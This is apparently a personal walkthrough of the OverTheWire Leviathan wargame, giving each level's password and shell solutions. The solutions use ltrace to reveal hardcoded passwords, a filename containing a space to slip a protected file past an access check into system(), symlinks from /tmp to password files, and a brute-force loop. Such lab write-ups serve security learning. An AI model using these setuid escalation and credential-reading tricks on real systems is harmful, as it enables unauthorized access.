---
title: leviathan
---

**Link**: [https://overthewire.org/wargames/leviathan/](https://overthewire.org/wargames/leviathan/)

**Info**

- data location: ~
- passwords location: /etc/leviathan_pass
- leviathAn, not leviathOn

**ToC**

- [leviathan0:leviathan0](#leviathan0-leviathan0)
- [leviathan1:rioGegei8m](#leviathan1-riogegei8m)
- [leviathan2:ougahZi8Ta](#leviathan2-ougahzi8ta)
- [leviathan3:Ahdiemoo1j](#leviathan3-ahdiemoo1j)
- [leviathan4:vuH0coox6m](#leviathan4-vuh0coox6m)
- [leviathan5:Tith4cokei](#leviathan5-tith4cokei)
- [leviathan6:UgaoFee4li](#leviathan6-ugaofee4li)
- [leviathan7:ahy7MaeBo9](#leviathan7-ahy7maebo9)

# leviathan0:leviathan0

```bash
$ ls -la
.backup

$ ls -la .backup
bookmarks.html

$ cat .backups/bookmarks.html | grep leviathan
<DT><A HREF="[http://leviathan.labs.overthewire.org/passwordus.html](http://leviathan.labs.overthewire.org/passwordus.html) | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A> # -> success!
```

# leviathan1:rioGegei8m

```bash
$ ls -la
check

$ ./check
password: 0000
Wrong password, Good Bye ...

$ ltrace ./check
__libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 <unfinished ...>
printf("password: ")                                                                     = 10
getchar(1, 0, 0x65766f6c, 0x646f6700password: password
)                                                    = 112
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                    = 97
getchar(1, 0, 0x65766f6c, 0x646f6700)                                                    = 115
strcmp("pas", "sex")                                                                     = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                     = 29
+++ exited (status 0) +++

$ ./check
password: sex

# into shell

$ cat /etc/leviathan_pass/leviathan2 # -> success
```

# leviathan2:ougahZi8Ta

```bash
$ ls -la
printfile

$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...

$ mkdir /tmp/james
$ echo attempt1 > f
$ ~/printfile f
attempt1

$ ltrace ~/printfile f
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("file", 4) = 0
snprintf("/bin/cat file", 511, "/bin/cat %s", "file") = 13
geteuid() = 12002
geteuid() = 12002
setreuid(12002, 12002) = 0
system("/bin/cat file"attempt1
<no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> ) = 0
+++ exited (status 0) +++

# both?
$ ~/printfile f /etc/leviathan_pass/leviathan3
attempt1

# symlink?
$ ln -s /etc/leviathan_pass/leviathan3 l3
$ ~/printfile l3 # -> You cant have that file...

# trick snprintf into reading both files?
$ echo attempt2 > "l3 f"
$ ~/printfile "l3 f" # -> success!

# snprintf looks like:
snprintf("/bin/cat l3 f", 511, "/bin/cat %s", "l3 f") = 16
```

# leviathan3:Ahdiemoo1j

```bash
$ ls -la
level3

$ ./level3
Enter the password> password
bzzzzzzzzap. WRONG

$ ltrace ./level3
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka") = -1
printf("Enter the password> ") = 20
fgets(Enter the password> password
"password\n", 256, 0xf7fc55a0) = 0xffffd590
strcmp("password\n", "snlprintf\n") = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
) = 19
+++ exited (status 0) +++

$ ./level3
Enter the password> snlprintf

[You've got shell]

$ cat /etc/leviathan_pass/leviathan4 → success
```

# leviathan4:vuH0coox6m

```bash
$ ls -la
.trash

$ cd .trash
$ ls -la
bin

$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010

# where does it come from?

$ ltrace ./bin
__libc_start_main(0x80484bb, 1, 0xffffd774, 0x80485b0 <unfinished ...>
fopen("/etc/leviathan_pass/leviathan5", "r") = 0
+++ exited (status 255) +++

# user cyberchef to convert from binary -> success!
```

# leviathan5:Tith4cokei

```bash
$ ls -la
leviathan5

$ ./leviathan5
Cannot find /tmp/file.log

$ echo pass > /tmp/file.log
$ ./leviathan5
pass
$ ltrace ./leviathan5
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r") = 0x804b008
fgetc(0x804b008) = 'p'
feof(0x804b008) = 0
putchar(112, 0x8048720, 0xf7e40890, 0x80486eb) = 112
fgetc(0x804b008) = 'a'
feof(0x804b008) = 0
putchar(97, 0x8048720, 0xf7e40890, 0x80486eb) = 97
fgetc(0x804b008) = 's'
feof(0x804b008) = 0
putchar(115, 0x8048720, 0xf7e40890, 0x80486eb) = 115
fgetc(0x804b008) = 's'
feof(0x804b008) = 0
putchar(115, 0x8048720, 0xf7e40890, 0x80486eb) = 115
fgetc(0x804b008) = '\n'
feof(0x804b008) = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebpass
) = 10
fgetc(0x804b008) = '\377'
feof(0x804b008) = 1
fclose(0x804b008) = 0
getuid() = 12005
setuid(12005) = 0
unlink("/tmp/file.log") = 0
+++ exited (status 0) +++

$ ln -s /etc/leviathan_pass/leviathan6 l6 # from home directory
ln: failed to create symbolic link 'l6': Permission denied

$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ./leviathan5 # -> success
```

# leviathan6:UgaoFee4li

```bash
$ ls -la
leviathan6

$./leviathan6
usage: ./leviathan6 <4 digit code>

$./leviathan6 0000
Wrong

$ for i in {0000..9999}; do echo $i; ./leviathan6 $i; done
# prints all the numbers followed by Wrong until, at 7XXX, it enters a shell

$ cat /etc/leviathan_pass/leviathan7 # -> success
```

# leviathan7:ahy7MaeBo9

```bash
$ ls -la
CONGRATULATIONS
```